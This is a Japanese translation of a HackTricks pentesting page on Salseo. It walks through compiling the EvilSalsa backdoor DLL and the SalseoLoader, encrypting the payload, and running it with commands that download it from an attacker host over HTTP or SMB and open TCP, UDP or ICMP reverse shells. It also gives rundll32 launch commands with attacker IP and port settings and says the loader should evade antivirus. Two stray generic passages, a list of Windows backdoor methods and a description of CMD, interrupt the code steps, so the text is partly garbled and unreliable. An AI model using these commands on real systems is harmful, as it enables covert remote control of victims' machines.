# Salseo

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## バイナリのコンパイル

githubからソースコードをダウンロードし、**EvilSalsa**と**SalseoLoader**をコンパイルします。コードをコンパイルするには**Visual Studio**が必要です。

これらのプロジェクトを、使用するWindowsボックスのアーキテクチャに合わせてコンパイルしてください（Windowsがx64をサポートしている場合は、そのアーキテクチャにコンパイルします）。

Visual Studio内の**左側の"Build"タブ**の**"Platform Target"**でアーキテクチャを**選択**できます。

(\*\*このオプションが見つからない場合は、**"Project Tab"**を押し、次に**"\<Project Name> Properties"**を押します)

![](<../.gitbook/assets/image (132).png>)

次に、両方のプロジェクトをビルドします（Build -> Build Solution）（ログ内に実行可能ファイルのパスが表示されます）：

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## バックドアの準備

まず、**EvilSalsa.dll**をエンコードする必要があります。これを行うには、pythonスクリプト**encrypterassembly.py**を使用するか、プロジェクト**EncrypterAssembly**をコンパイルできます：

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows

Windowsは、最も一般的なオペレーティングシステムの1つであり、多くのバージョンが存在します。Windowsには、バックドアを作成するためのさまざまな方法があります。

#### リモートデスクトップ

リモートデスクトップ（RDP）は、Windowsマシンにリモートでアクセスするための機能です。攻撃者は、有効な資格情報を使用してRDPに接続し、ターゲットマシンにアクセスすることができます。

#### バックドアアプリケーション

バックドアアプリケーションは、ターゲットマシンにインストールされたソフトウェアの一部として動作します。これにより、攻撃者はターゲットマシンにアクセスし、機密情報を盗むことができます。

#### サービスの改ざん

攻撃者は、Windowsサービスを改ざんすることでバックドアを作成することができます。これにより、攻撃者はターゲットマシンにアクセスし、システムの制御を取ることができます。

#### レジストリの改ざん

レジストリは、Windowsオペレーティングシステムの設定情報を格納するデータベースです。攻撃者は、レジストリを改ざんすることでバックドアを作成し、ターゲットマシンにアクセスすることができます。

#### ファイルの改ざん

攻撃者は、Windowsシステムファイルを改ざんすることでバックドアを作成することができます。これにより、攻撃者はターゲットマシンにアクセスし、システムを制御することができます。

#### プロセスの改ざん

攻撃者は、Windowsプロセスを改ざんすることでバックドアを作成することができます。これにより、攻撃者はターゲットマシンにアクセスし、システムを制御することができます。

#### ネットワークトラフィックの傍受

攻撃者は、ネットワークトラフィックを傍受することでバックドアを作成することができます。これにより、攻撃者はターゲットマシンにアクセスし、機密情報を盗むことができます。

#### プリインストールバックドア

プリインストールバックドアは、Windowsマシンに最初から組み込まれているバックドアです。これにより、攻撃者はターゲットマシンにアクセスし、システムを制御することができます。

#### ゼロデイエクスプロイト

ゼロデイエクスプロイトは、まだ修正されていないセキュリティの脆弱性を利用する攻撃手法です。攻撃者は、ゼロデイエクスプロイトを使用してWindowsマシンにバックドアを作成し、システムにアクセスすることができます。

#### パスワードのクラック

攻撃者は、パスワードのクラックを使用してWindowsマシンにアクセスすることができます。これにより、攻撃者はターゲットマシンにバックドアを作成し、システムを制御することができます。

以上が、Windowsでバックドアを作成するための一般的な方法です。これらの方法を理解し、対策を講じることが重要です。
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok、Salseoのすべてを実行するために必要なものが揃いました：**エンコードされたEvilDalsa.dll**と**SalseoLoaderのバイナリ**。

**SalseoLoader.exeバイナリをマシンにアップロードしてください。どのAVにも検出されないはずです...**

## **バックドアの実行**

### **TCPリバースシェルの取得（HTTPを介してエンコードされたdllをダウンロード）**

リバースシェルリスナーとHTTPサーバーを起動して、エンコードされたevilsalsaを提供することを忘れないでください。
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **UDPリバースシェルの取得（SMBを介してエンコードされたdllをダウンロード）**

リバースシェルのリスナーとしてncを起動し、エンコードされたevilsalsaを提供するためのSMBサーバー（impacket-smbserver）を起動することを忘れないでください。
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **ICMPリバースシェルの取得（既に被害者内にエンコードされたdllが存在する場合）**

**今回は、クライアント側でリバースシェルを受け取るための特別なツールが必要です。ダウンロードしてください：** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **ICMP応答の無効化：**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### クライアントの実行:

```bash
./client
```

クライアントを実行します。
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### ターゲット内部で、salseoの実行を行います：
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## DLLのエクスポートメイン関数としてSalseoLoaderをコンパイルする

Visual Studioを使用してSalseoLoaderプロジェクトを開きます。

### メイン関数の前に\[DllExport]を追加します。

![](<../.gitbook/assets/image (2) (1) (1) (1).png>)

### このプロジェクトにDllExportをインストールします。

#### **ツール** --> **NuGetパッケージマネージャー** --> **ソリューションのNuGetパッケージを管理...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1).png>)

#### **DllExportパッケージを検索します（ブラウズタブを使用）し、インストールを押します（ポップアップを受け入れます）**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1).png>)

プロジェクトフォルダには、**DllExport.bat**と**DllExport\_Configure.bat**のファイルが表示されます。

### DllExportをアンインストールします。

**アンインストール**を押します（はい、奇妙ですが、信じてください、必要です）

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### Visual Studioを終了し、DllExport\_configureを実行します。

Visual Studioを**終了**します。

次に、**SalseoLoaderフォルダ**に移動し、**DllExport\_Configure.bat**を実行します。

**x64**を選択します（x64ボックス内で使用する場合、私の場合はそうでした）、**System.Runtime.InteropServices**（**DllExportの名前空間内**）を選択し、**Apply**を押します。

![](<../.gitbook/assets/image (7) (1) (1) (1).png>)

### Visual Studioでプロジェクトを再度開きます。

**\[DllExport]**はもはやエラーとしてマークされません。

![](<../.gitbook/assets/image (8) (1).png>)

### ソリューションをビルドします。

**出力の種類 = クラスライブラリ**を選択します（プロジェクト --> SalseoLoaderのプロパティ --> アプリケーション --> 出力の種類 = クラスライブラリ）

![](<../.gitbook/assets/image (10) (1).png>)

**x64プラットフォーム**を選択します（プロジェクト --> SalseoLoaderのプロパティ --> ビルド --> プラットフォームターゲット = x64）

![](<../.gitbook/assets/image (9) (1) (1).png>)

ソリューションをビルドするには：ビルド --> ソリューションのビルド（出力コンソールに新しいDLLのパスが表示されます）

### 生成されたDLLをテストします。

テストしたい場所にDLLをコピーして貼り付けます。

実行するコマンド：
```
rundll32.exe SalseoLoader.dll,main
```
もしエラーが表示されなければ、おそらく機能するDLLを持っています！

## DLLを使用してシェルを取得する

**HTTPサーバー**を使用して、**ncリスナー**を設定することを忘れないでください。

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
CMD（コマンドプロンプト）は、Windowsオペレーティングシステムで使用されるコマンドラインインターフェースです。CMDを使用すると、コマンドを入力してシステムの様々な操作を実行することができます。CMDは、システムの設定変更、ファイルの操作、ネットワークの設定など、さまざまなタスクを実行するために使用されます。CMDは、ハッカーにとっても便利なツールであり、システムの脆弱性を悪用するために使用されることもあります。ハッカーは、CMDを使用してバックドアを作成し、システムに不正アクセスすることができます。CMDは、ハッキングの技術の一部として広く使用されています。
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社で働いていますか？** HackTricksで**会社を宣伝したい**ですか？または、**PEASSの最新バージョンにアクセスしたい**ですか？または、HackTricksをPDFでダウンロードしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有する**には、[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。

</details>
